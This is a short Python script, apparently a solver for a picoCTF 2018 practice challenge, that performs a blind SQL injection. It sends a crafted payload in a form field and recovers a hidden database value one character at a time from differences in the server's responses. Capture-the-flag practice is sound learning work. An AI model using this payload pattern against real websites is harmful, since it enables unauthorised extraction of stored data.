import requests

# Solve
# Blind SQL injection

url = 'http://2018shell3.picoctf.com:2644/answer2.php'
charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
answer = ''

for i in range(1, 15):
    for char in charset:
        s = char
        send_sql = "' or (select count(*) from answers where substr(answer, %s, 1) = '%s') > 0 --" % (i, s)
        payload = {'answer': send_sql, 'debug': 0}
        r = requests.post(url, data=payload)
        if 'close.' in r.text:
            answer += char
            print(answer)
            break
